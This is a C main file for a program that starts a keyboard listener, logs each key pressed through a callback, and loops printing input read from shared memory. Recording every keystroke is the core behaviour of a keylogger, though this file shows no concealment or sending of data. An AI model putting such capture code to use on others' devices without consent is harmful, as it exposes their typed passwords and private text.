#include <stdio.h>
#include <unistd.h>

#include "settings/constants.h"
#include "keyboard/listener.h"
#include "memory/memory.h"

static logger_t logger;

void on_key_pressed_callback(char key) {
    logger_info(logger,"Received a key: %c", key);
}

void init_memory() {
    memory_parameters_s parameters;
    logger_create(&(parameters.logger), "memory", CONSTANT_LOG_LEVEL);
    memory_init(&parameters);
}

void init_keyboard_listener() {
    keyboard_listener_parameters_s parameters;
    logger_create(&(parameters.logger), "keyboard", CONSTANT_LOG_LEVEL);
    parameters.key_pressed_callback = on_key_pressed_callback;
    keyboard_listener_create(&parameters);
}

void init_logger() {
    logger_create(&logger, "app", CONSTANT_LOG_LEVEL);
}

void init() {
    init_memory();
    init_keyboard_listener();
    init_logger();
}

int main() {
    char read_buffer[257];
    unsigned int read_bytes;

    init();

    if (KEYBOARD_LISTENER_E_SUCCESSFUL != keyboard_listener_start()) {
        logger_error(logger, "Could not start keyboard listener");
        return -1;
    }

    while(TRUE) {
        if (KEYBOARD_LISTENER_E_SUCCESSFUL != keyboard_listener_read(read_buffer, &read_bytes)) {
            logger_warn(logger, "Failed to read from shared memory..");
            continue;
        }

        if (read_bytes > 0) {
            printf("%s", read_buffer);
        }

        usleep(30000);
    }

    return 0;
}
